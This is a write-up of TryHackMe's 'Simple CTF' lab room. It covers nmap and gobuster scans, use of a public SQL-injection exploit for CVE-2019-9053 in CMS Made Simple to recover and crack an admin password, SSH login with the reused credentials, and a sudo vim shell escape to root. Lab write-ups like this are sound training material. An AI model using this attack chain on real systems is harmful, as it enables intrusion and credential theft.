[Simple CTF](https://tryhackme.com/room/easyctf) is, as described, a simple CTF; by TryHackMe.

## [Task 1] Simple CTF

### 1. How many services are running under port 1000?

```
kali@kali:~/Desktop/TryHackMe$ nmap target.thm -A 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 14:10 EDT
Nmap scan report for target.thm (target.thm)
Host is up (0.019s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.8.219
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.31 seconds

```

### 2. What is running on the higher port?
The question was a little badly written, especially if factoring in the previous question.

```
kali@kali:~/Desktop/TryHackMe$ nmap target.thm -A 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 14:10 EDT
Nmap scan report for target.thm (target.thm)
Host is up (0.019s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.8.219
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.31 seconds

```

### 3. What's the CVE you're using against the application? 
#### Potential exploitable services
From previous scans, look into versioned services.
- vsftpd 3.0.3
- openemr-5_0_1_3 
- Apache httpd 2.4.18

Before seeking out a CVE, lets dive in further.

#### Browsing web server for further clues
By browsing to the host, we see a default apache page; from here, browsed to `http://target.thm/robots.txt` 

Notably, we find text the hints towards a _potential_ CVE on `2003-03-19`, the server being `CUPS`, and we also see a potential username `mike`. And a mention of `openemr-5_0_1_3`.


```

# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
```

#### Directory enumeration

Although the `robots.txt` file lent us some information on what may be exploitable; I took the chance to run a directory enumeration scan with `gobuster`, to see if I could find anything of interest hidden away that may not have been considered.

```
kali@kali:~$ gobuster dir --url http://target.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.tx
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/15 14:42:53 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/simple (Status: 301)
===============================================================
2020/09/15 14:43:02 Finished
===============================================================

```

And notably, `/simple` stood out as something I'd not yet considered. 

`/simple` has a CMS hosted, with the following version information:

```
© Copyright 2004 - 2020 - CMS Made Simple
This site is powered by CMS Made Simple version 2.2.8
```

I decided to further enumerate this CMS:
```
kali@kali:~$ gobuster dir --url http://target.thm/simple -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target.thm/simple
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/15 14:46:13 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/assets (Status: 301)
/doc (Status: 301)
/index.php (Status: 200)
/lib (Status: 301)
/modules (Status: 301)
/tmp (Status: 301)
/uploads (Status: 301)
===============================================================
2020/09/15 14:46:23 Finished
===============================================================

```

And pulled out a few more directories of potential interest and few more point of potential access.

#### Finding exploit (and CVE)

Lets search for an exploit with `searchsploit`

```
kali@kali:~$ searchsploit cms made simple
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution  | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting             | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                 | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilitie | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                      | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                            | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                   | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload       | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                           | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                          | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting    | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                       | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                       | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion          | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forger | php/webapps/34068.html
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                       | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                          | php/webapps/44192.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)         | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload           | php/webapps/48742.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution          | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution          | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning        | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                               | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload       | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload  | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary Fil | php/webapps/46546.py
----------------------------------------------------------------------- ---------------------------------
```

There're a few options here. But the most interesting to me is  `CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py` as previous exploits may have been patched. Remeber, the current version on `/simple` is `2.2.8` as we pulled earlier.

#### Diving into the Exploit

Lets open up the exploit, and hopefully pull the CVE.

```
  GNU nano 5.2                                                                                /usr/share/exploitdb/exploits/php/webapps/46635.py                                                                                           
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

import requests
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib
```

And in the header section we get the info we're intersted in.

### 4. What type of exploit is this?

If it wasn't already apparent from the previous step, this is an SQLi(SQL injection) exploit.

### 5. What's the password?

If we're going to get the password, we'll need to start using the exploit.

#### Using the exploit

After reading the code, and determining it's relative safety, it details the following options as being used:

```
parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)
```

Therefore, we need to add _flags_ when we run it. However, before getting into that... 

#### Fixing the _outdated_ exploit

I copied the exploit to another directory, because it's _oudated_ and doesn't work with Python 3.

To fix it: 
- find all the `print` statements and ensure that the script uses `print(something)` instead of `print something`.
- ensure the `crack_password` function uses `str(salt + line).encode()` not just `salt + line` in the `hashlib.md5` call.

If you're interested, I've shared the updated [Python exploit script for this task](https://github.com/josh-a-miller/ctf/blob/master/try-hack-me/simple-ctf/updated-exploit.py).

#### Running the script

The script pulled the following data: 

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

And exposes the password that we're looking for.

### 6. Where can you login with the details obtained?

The stolen & cracked credentials allow us the access the admin portal; but we're looking for a 3 digit directory to solve the flag. 
Let's assume that `mitch` uses their passed `secret` on other services. We already know what there's both an `ssh` and an `ftp` server.

Let's test them.

#### FTP

FTP _does not_ allow us to login. Namely because it _only_ accepts Anonymous login. Which, while interesting, isn't enough for me to dive deeper. For now.

#### SSH

It's important to note that in the earlier `nmap` scan. The ssh service is running on port `2222`. This port is _not_ default, and as such requires you to specify the port in your ssh connect.

```
kali@kali:~/Desktop/TryHackMe/simple-ctf$ ssh mitch@target.thm -p 2222
The authenticity of host '[target.thm]:2222 ([target.thm]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[target.thm]:2222,[target.thm]:2222' (ECDSA) to the list of known hosts.
mitch@target.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ whoami
mitch
```

The ssh connect works, with the password we procured earlier, and we have shell as `mitch`.

### 7. What's the user flag?

Now that we've got shell, we can search for a user flag.
```
$ ls -lah
total 36K
drwxr-x--- 3 mitch mitch 4,0K aug 19  2019 .
drwxr-xr-x 4 root  root  4,0K aug 17  2019 ..
-rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
-rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
-rw-r--r-- 1 mitch mitch 3,7K sep  1  2015 .bashrc
drwx------ 2 mitch mitch 4,0K aug 19  2019 .cache
-rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
-rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
$ cat user.txt
G00d j0b, keep up!
```

### 8. Is there any other user in the home directory? What's its name?

Lets dig in deep, and see what other users are on the system.

```
$ cd /home; ls 
mitch  sunbath
```

### 9. What can you leverage to spawn a privileged shell?

Next we need to look for a priviledge escalation vector. Lets start with a `sudo -l` and see what we can run as `sudo`(root).

```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

### 10. What's the root flag?

Now we've found our escalation vector let's exploit it; then navigate to the `/root` directory in search for the root flag.

```
$ sudo vim
```
_While in the Vim editor, spawn a shell with command:_ `!sh`
```
# whoami
root
# cd /root; ls -lah
total 28K
drwx------  4 root root 4,0K aug 17  2019 .
drwxr-xr-x 23 root root 4,0K aug 19  2019 ..
-rw-r--r--  1 root root 3,1K oct 22  2015 .bashrc
drwx------  2 root root 4,0K aug 17  2019 .cache
drwxr-xr-x  2 root root 4,0K aug 17  2019 .nano
-rw-r--r--  1 root root  148 aug 17  2015 .profile
-rw-r--r--  1 root root   24 aug 17  2019 root.txt
# cat root.txt
```